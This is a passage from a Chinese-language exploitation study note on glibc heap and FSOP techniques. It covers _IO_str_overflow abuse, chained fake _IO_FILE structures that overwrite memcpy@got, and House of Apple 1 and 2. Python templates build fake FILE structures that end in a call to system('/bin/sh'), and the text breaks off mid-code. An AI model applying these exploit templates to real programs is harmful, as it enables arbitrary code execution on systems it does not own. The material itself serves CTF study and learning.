<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>10</span><span class=p>,</span> <span class=mh>0x94</span><span class=p>)</span></span></span></code></pre></div></div><p>​ <img src=/img/pwn_note.zh-cn.assets/image-20250122210209656.png alt=图片无法加载></p><p>⑥ 伪造 chunk，最终退出 exit 触发</p><p><strong>调用过程</strong></p><ul><li>退出触发<code>_IO_flush_all_lockp</code>-><code>_IO_str_overflow</code><ul><li><code>new_buf = malloc (new_size)</code>将会从 tcache 中申请出包含<code>__free_hook</code>的 chunk</li><li><code>memcpy (new_buf, old_buf, old_blen)</code>将伪造的<code>_IO_buf_base</code>处拷贝到 chunk 中</li><li>此时<code>__free_hook</code>被覆盖为<code>system</code>，old_buf 处为<code>'/bin/sh'</code></li><li><code>free (old_buf)</code>释放时相当于调用 system 函数，old_buf 中为参数<code>/bin/sh</code>，获取 shell</li></ul></li></ul><img src=/img/pwn_note.zh-cn.assets/image-20250122211820980.png alt=图片无法加载><p><strong>模板</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>fake_file_addr</span> <span class=o>=</span> <span class=n>heap_base</span> <span class=o>+</span> <span class=mh>0x6d0</span>
</span></span><span class=line><span class=cl><span class=n>n64</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>:</span> <span class=p>(</span><span class=n>x</span> <span class=o>+</span> <span class=mh>0x10000000000000000</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFFFFFFFFFF</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _IO_read_end</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _IO_read_base</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>  <span class=c1># _IO_write_base</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>n64</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>))</span>  <span class=c1># _IO_write_ptr</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _IO_write_end</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_file_addr</span> <span class=o>+</span> <span class=mh>0xe0</span><span class=p>)</span>  <span class=c1># _IO_buf_base;</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_file_addr</span> <span class=o>+</span> <span class=mh>0xe0</span> <span class=o>+</span> <span class=mi>8</span> <span class=o>*</span> <span class=mi>3</span><span class=p>)</span>  <span class=c1># _IO_buf_end should usually be (_IO_buf_base + 1)</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span>  <span class=c1># from _IO_save_base to _markers</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;_IO_2_1_stdout_&#39;</span><span class=p>])</span>  <span class=c1># the FILE chain ptr</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>  <span class=c1># _fileno for stderr is 2</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _flags2, usually 0</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xFFFFFFFFFFFFFFFF</span><span class=p>)</span>  <span class=c1># _old_offset, -1</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p16</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _cur_column</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span>  <span class=c1># _vtable_offset</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span>  <span class=c1># _shortbuf[1]</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># padding</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;_IO_2_1_stdout_&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=mh>0x1ea0</span><span class=p>)</span>  <span class=c1># _IO_stdfile_1_lock</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xFFFFFFFFFFFFFFFF</span><span class=p>)</span>  <span class=c1># _offset, -1</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _codecvt, usually 0</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;_IO_2_1_stdout_&#39;</span><span class=p>]</span> <span class=o>-</span> <span class=mh>0x160</span><span class=p>)</span>  <span class=c1># _IO_wide_data_1</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>*</span> <span class=mi>3</span>  <span class=c1># from _freeres_list to __pad5</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0xFFFFFFFF</span><span class=p>)</span>  <span class=c1># _mode, usually -1</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span> <span class=o>*</span> <span class=mi>19</span>  <span class=c1># _unused2</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>=</span> <span class=n>fake_file</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0xD8</span> <span class=o>-</span> <span class=mh>0x10</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>  <span class=c1># adjust to vtable</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>IO_str_jumps</span><span class=p>)</span>  <span class=c1># fake vtable</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fake_file</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>])</span></span></span></code></pre></div></div><h5 id=glibc233>glibc>2.33</h5><ul><li>glibc-2.34 起取消了 ptmalloc 中各种 hook，<code>_IO_str_overflow</code>中<code>memcpy</code>实际通过 got 表调用</li><li>构造多个<code>_IO_FILE</code>链将<code>memcpy@got</code>改写成<code>&amp;system</code>，调用 memcpy 获取 shell</li><li>通过 gdb 命令<code>u _IO_str_overflow</code>中<code>call *ABS*+0xabc@plt</code>指令所在地址中实际 call 的地址 0xbcd，<code>u 0xbcd</code>中<code>bnd jmp qword ptr [rip + offset]</code>找到的地址处找到 memcpy@got 表地址</li></ul><p><strong>利用</strong></p><img src=/img/pwn_note.zh-cn.assets/image-20250123202353253.png alt=图片无法加载><ul><li>泄露 libc 基址、堆地址，将 chunk 2：fake_file1 置入 largebin 中</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x418</span><span class=p>)</span> <span class=c1># fake_file2</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x288</span><span class=p>)</span> <span class=c1># fake tcache_pthread_struct</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=mh>0x428</span><span class=p>)</span> <span class=c1># fake_file1</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=mh>0x418</span><span class=p>)</span> <span class=c1># fake_file3</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=mh>0x418</span><span class=p>)</span> <span class=c1># fake_file4</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>5</span><span class=p>,</span> <span class=mh>0x50</span><span class=p>)</span> <span class=c1># memcpy data: /bin/sh, system</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x418</span><span class=p>)</span> <span class=c1># chunk2 进入 large bin</span></span></span></code></pre></div></div><ul><li>large bin attack 将<code>_IO_list_all</code> 修改为 chunk 2 的地址，此时，编辑 fake_file1，将其<code>_IO_buf_base</code>指向<code>tcache_perthread_struct</code>，且<code>_chain</code>指向 fake_file2</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># find _IO_str_jumps</span>
</span></span><span class=line><span class=cl><span class=n>IO_file_jumps</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;_IO_file_jumps&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>IO_str_underflow</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;_IO_str_underflow&#39;</span><span class=p>]</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>address</span>
</span></span><span class=line><span class=cl><span class=n>IO_str_underflow_ptr</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=n>p64</span><span class=p>(</span><span class=n>IO_str_underflow</span><span class=p>)))</span>
</span></span><span class=line><span class=cl><span class=n>IO_str_jumps</span> <span class=o>=</span> <span class=n>IO_str_underflow_ptr</span><span class=p>[</span><span class=n>bisect_left</span><span class=p>(</span><span class=n>IO_str_underflow_ptr</span><span class=p>,</span> <span class=n>IO_file_jumps</span> <span class=o>+</span> <span class=mh>0x20</span><span class=p>)]</span> <span class=o>-</span> <span class=mh>0x20</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>fake_file1</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>fake_file1</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _IO_read_end</span>
</span></span><span class=line><span class=cl><span class=n>fake_file1</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _IO_read_base</span>
</span></span><span class=line><span class=cl><span class=n>fake_file1</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>  <span class=c1># _IO_write_base</span>
</span></span><span class=line><span class=cl><span class=n>fake_file1</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>n64</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>))</span>  <span class=c1># _IO_write_ptr</span>
</span></span><span class=line><span class=cl><span class=n>fake_file1</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _IO_write_end</span>
</span></span><span class=line><span class=cl><span class=n>fake_file1</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>tcache_pthread_struct_addr</span><span class=p>)</span>  <span class=c1># _IO_buf_base;</span>
</span></span><span class=line><span class=cl><span class=n>fake_file1</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>tcache_pthread_struct_addr</span><span class=p>)</span>  <span class=c1># _IO_buf_end should usually be (_IO_buf_base + 1)</span>
</span></span><span class=line><span class=cl><span class=n>fake_file1</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span>  <span class=c1># from _IO_save_base to _markers</span>
</span></span><span class=line><span class=cl><span class=n>fake_file1</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>file2_addr</span><span class=p>)</span>  <span class=c1># the FILE chain ptr</span>
</span></span><span class=line><span class=cl><span class=n>fake_file1</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>  <span class=c1># _fileno for stderr is 2</span>
</span></span><span class=line><span class=cl><span class=n>fake_file1</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _flags2, usually 0</span>
</span></span><span class=line><span class=cl><span class=n>fake_file1</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xFFFFFFFFFFFFFFFF</span><span class=p>)</span>  <span class=c1># _old_offset, -1</span>
</span></span><span class=line><span class=cl><span class=n>fake_file1</span> <span class=o>+=</span> <span class=n>p16</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _cur_column</span>
</span></span><span class=line><span class=cl><span class=n>fake_file1</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span>  <span class=c1># _vtable_offset</span>
</span></span><span class=line><span class=cl><span class=n>fake_file1</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span>  <span class=c1># _shortbuf[1]</span>
</span></span><span class=line><span class=cl><span class=n>fake_file1</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># padding</span>
</span></span><span class=line><span class=cl><span class=n>fake_file1</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;_IO_2_1_stdout_&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=mh>0x1ea0</span><span class=p>)</span>  <span class=c1># _IO_stdfile_1_lock</span>
</span></span><span class=line><span class=cl><span class=n>fake_file1</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xFFFFFFFFFFFFFFFF</span><span class=p>)</span>  <span class=c1># _offset, -1</span>
</span></span><span class=line><span class=cl><span class=n>fake_file1</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>  <span class=c1># _codecvt, usually 0</span>
</span></span><span class=line><span class=cl><span class=n>fake_file1</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;_IO_2_1_stdout_&#39;</span><span class=p>]</span> <span class=o>-</span> <span class=mh>0x160</span><span class=p>)</span>  <span class=c1># _IO_wide_data_1</span>
</span></span><span class=line><span class=cl><span class=n>fake_file1</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>*</span> <span class=mi>3</span>  <span class=c1># from _freeres_list to __pad5</span>
</span></span><span class=line><span class=cl><span class=n>fake_file1</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0xFFFFFFFF</span><span class=p>)</span>  <span class=c1># _mode, usually -1</span>
</span></span><span class=line><span class=cl><span class=n>fake_file1</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span> <span class=o>*</span> <span class=mi>19</span>  <span class=c1># _unused2</span>
</span></span><span class=line><span class=cl><span class=n>fake_file1</span> <span class=o>=</span> <span class=n>fake_file1</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0xD8</span> <span class=o>-</span> <span class=mh>0x10</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>  <span class=c1># adjust to vtable</span>
</span></span><span class=line><span class=cl><span class=n>fake_file1</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>IO_str_jumps</span><span class=p>)</span>  <span class=c1># fake vtable</span></span></span></code></pre></div></div><ul><li>构造 fake_file2，板子同上，区别为``_IO_buf_base<code>指向</code>fake tcache_perthread_struct<code>，</code>_IO_buf_end<code>设置为</code>fake tcache_perthread_struct + (0x288 - 0x100) / 2<code>，会用到 memcpy 拷贝，且</code>_chain`指向 fake_file3，且编辑 fake tcache_perthread_struct 即 chunk1</li><li>构造 fake_file3，<code>_chain</code>指向 fake_file4，``_IO_buf_base<code>指向</code>chunk5`，构造 chunk5 为 sh 字符串以及 system 函数地址</li><li>退出时触发</li></ul><p><strong>调用过程</strong></p><ul><li>第一个<code>_IO_FILE</code>由<code>_IO_flush_all</code>调用<code>_IO_str_overflow</code>中的 free 函数将<code>tcache_perthread_struct</code>释放</li><li>第二个<code>_IO_FILE</code>先调用<code>_IO_str_overflow</code>中 malloc 函数将<code>tcache_perthread_struct</code>申请出来，调用<code>memcpy</code>用<code>fake tcache_perthread_struct</code>内容控制<code>tcache_perthread_struct</code>中的数据，使其中<code>entries</code>指向<code>&amp;memcpy@got - 0x10</code>，使得后续可以通过 size 等比计算从相应位置申请出来</li><li>第三个<code>_IO_FILE</code>调用<code>_IO_str_overflow</code>中 malloc 函数将<code>&amp;memcpy@got - 0x10</code>申请出来，用<code>memcpy</code>将<code>memcpy@got</code>覆盖为 system 函数地址，将<code>&amp;memcpy@got - 0x10</code>处写入<code>/bin/sh</code>字符串</li><li>第四个<code>_IO_FILE</code>调用 malloc 将<code>&amp;memcpy@got - 0x10</code>申请出来，调用 memcpy 即调用<code>system("/bin/sh")</code></li></ul><h4 id=house-of-apple>House of Apple</h4><h5 id=house-of-apple1>House of Apple1</h5><ul><li>glibc>2.34，只有一次任意地址写（large bin attack）进行 FSOP</li><li>需泄露 libc 基址和堆地址，且从 main 函数返回或调用<code>exit</code>函数</li></ul><p><strong>原理</strong></p><p>main 函数返回调用链：<code>exit</code> > <code>fcloseall</code> > <code>_IO_cleanup</code> > <code>_IO_flush_all_lockp</code> > <code>_IO_OVERFLOW</code></p><p>遍历<code>_IO_list_all</code>存放的每一个<code>IO_FILE</code>结构体，调用<code>vtable->_overflow</code>指针指向的函数，劫持<code>_IO_list_all</code>替换为伪造<code>IO_FILE</code>，利用<code>_IO_FILE</code>的成员<code>_wide_data</code>，<code>struct _IO_wide_data *_wide_data</code>在<code>_IO_FILE</code>中偏移为 0xa0</p><p><code>overflow_buf</code>相对于<code>_IO_FILE</code>结构体的偏移为<code>0xf0</code></p><ul><li>伪造<code>_wide_data</code>，在<code>_IO_wstrn_overflow</code>函数中可将已知地址空间上某值修改为一个已知值</li><li>由<code>_IO_wstrn_overflow</code>可控制从<code>fp->_wide_data</code>开始一定范围内的内存值，等价于<strong>任意地址写已知地址</strong></li></ul><p><strong>利用</strong></p><p>堆伪造<code>_IO_FILE</code>结构体，且已知其地址为<strong>A</strong>，将<strong>A+0xd8</strong>替换为<code>_IO_wstrn_jumps</code>地址，<strong>A+0xc0</strong>设置为<strong>B</strong>，设置其他成员以能调用到<code>_IO_OVERFLOW</code>，<code>exit</code>会一路调用到<code>_IO_wstrn_overflow</code>，将<strong>B</strong>至<strong>B+0x38</strong>的地址区域内容替换为<strong>A+0xf0</strong>或<strong>A+0x1f0</strong></p><p><strong>绕过</strong>：</p><ul><li><p><code>f->_wide_data->_IO_buf_base</code>为空或<code>f->_flags2 & _IO_FLAGS2_USER_WBUF</code>不为 0，其中<code>_IO_FLAGS2_USER_WBUF</code>为 8，绕过<code>_IO_wsetb</code>函数中的<code>free</code>函数</p></li><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=nf>free</span><span class=p>(</span><span class=n>f</span><span class=o>-&gt;</span><span class=n>_wide_data</span><span class=o>-&gt;</span><span class=n>_IO_buf_base</span><span class=p>)</span></span></span></code></pre></div></div></li><li><p>满足<code>fp->_wide_data->_IO_buf_base != snf->overflow_buf</code>进入<code>_IO_wstrn_overflow</code>的<code>if</code>判断</p></li><li><p>满足<code>fp->_mode &lt;= 0</code>以及<code>fp->_IO_write_ptr > fp->_IO_write_base</code>可用于 FSOP 触发</p></li></ul><p><strong>思路</strong></p><p>① 修改 tcache 线程变量</p><ul><li>伪造至少 2 个<code>_IO_FILE</code>结构体</li><li>第一个<code>_IO_FILE</code>执行<code>_IO_OVERFLOW</code>利用<code>_IO_wstrn_overflow</code>修改<code>tcache</code>全局变量为已知值，控制<code>tcache bin</code>分配</li><li>第二个<code>_IO_FILE</code>执行<code>_IO_OVERFLOW</code>利用<code>malloc</code>任意地址分配并使用<code>memcpy</code>任意地址写任意值</li><li>用 2 次任意地址写任意值修改<code>pointer_guard</code>，<code>IO_accept_foreign_vtables</code>值绕过<code>_IO_vtable_check</code>函数检测，或利用任意地址写修改<code>libc.got</code>函数地址，很多 IO 流函数调用<code>strlen/strcpy/memcpy/memset</code>会调用 got 表中函数</li><li>利用一个<code>_IO_FILE</code>随意伪造 vtable 劫持也可</li></ul><p>② 修改<code>mp_</code>结构体</p><ul><li><p>至少伪造 2 个<code>_IO_FILE</code>结构体</p></li><li><p>第一个<code>_IO_FILE</code>执行<code>_IO_OVERFLOW</code>利用<code>_IO_wstrn_overflow</code>修改<code>mp_.tcache_bins</code>为极大值，使得大 chunk 也通过<code>tcachebin</code>管理</p></li><li><p>或修改掉<code>tcache_count</code>可以控制链表的 <code>chunk</code> 的数量</p></li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>tcache_bins</span> <span class=o>=</span> <span class=n>mp_</span> <span class=o>+</span> <span class=mi>80</span>
</span></span><span class=line><span class=cl><span class=n>tcache_max_bytes</span> <span class=o>=</span> <span class=n>mp_</span> <span class=o>+</span> <span class=mi>88</span></span></span></code></pre></div></div><img src=/img/pwn_note.zh-cn.assets/172844676894978.png alt=图片无法加载><p>③ 修改<code>pointer_guard</code></p><ul><li>至少伪造 2 个<code>_IO_FILE</code>结构体</li><li>第一个<code>_IO_FILE</code>执行<code>_IO_OVERFLOW</code>利用<code>_IO_wstrn_overflow</code>修改<code>tls</code>结构体<code>pointer_guard</code>值为已知值</li><li>第二个<code>_IO_FILE</code>结构体用来做<code>house of emma</code>劫持程序执行流</li></ul><p>④ 修改<code>global_max_fast</code>全局变量</p><h5 id=house-of-apple2>House of Apple2</h5><p>四种利用可通过 gdb <code>tele &_IO_file_jumps</code>来找到对应四个函数地址</p><p>① <code>_IO_wfile_overflow</code></p><ul><li><code>_wide_data</code>结构中由类似<code>vtable</code>的<code>_wide_vtable</code>指向<code>_IO_jump_t</code>结构</li><li>glibc 定义了调用<code>_wide_vtable</code>中函数的宏，其中<code>_IO_WSETBUF, _IO_WUNDERFLOW, _IO_WDOALLOCATE, _IO_WOVERFLOW</code>等缺少对<code>_wide_vtable</code>位置检查</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// _IO_wdoallocbuf函数中_IO_WDOALLOCATE宏
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>((</span><span class=o>*</span><span class=p>(</span><span class=nf>__typeof__</span> <span class=p>(((</span><span class=k>struct</span> <span class=n>_IO_FILE</span><span class=p>){}).</span><span class=n>_wide_data</span><span class=p>)</span> <span class=o>*</span><span class=p>)(((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span> <span class=p>((</span><span class=n>fp</span><span class=p>)))</span> <span class=o>+</span> <span class=nf>__builtin_offsetof</span> <span class=p>(</span><span class=k>struct</span> <span class=n>_IO_FILE</span><span class=p>,</span> <span class=n>_wide_data</span><span class=p>)))</span><span class=o>-&gt;</span><span class=n>_wide_vtable</span><span class=o>-&gt;</span><span class=n>__doallocate</span><span class=p>)</span> <span class=p>(</span><span class=n>fp</span><span class=p>)</span></span></span></code></pre></div></div><ul><li>修改<code>vtable</code>，程序调用<code>_wide_vtable</code>中函数，再将<code>_wide_vtable</code>指向一个伪造函数表劫持执行流</li></ul><p><strong>利用</strong></p><img src=/img/pwn_note.zh-cn.assets/image-20250124161719221.png alt=图片无法加载><p><strong>完整利用</strong></p><ul><li><p>确定构造 chunk 1 为伪造 chunk</p><ul><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x600</span><span class=p>)</span>	<span class=c1># 0   	290</span>
</span></span><span class=line><span class=cl><span class=n>malloc</span><span class=p>(</span><span class=mh>0x6e0</span><span class=p>)</span>	<span class=c1># 1 !   8a0</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>			<span class=c1># 			 , 0 -&gt; unsorted bin</span>
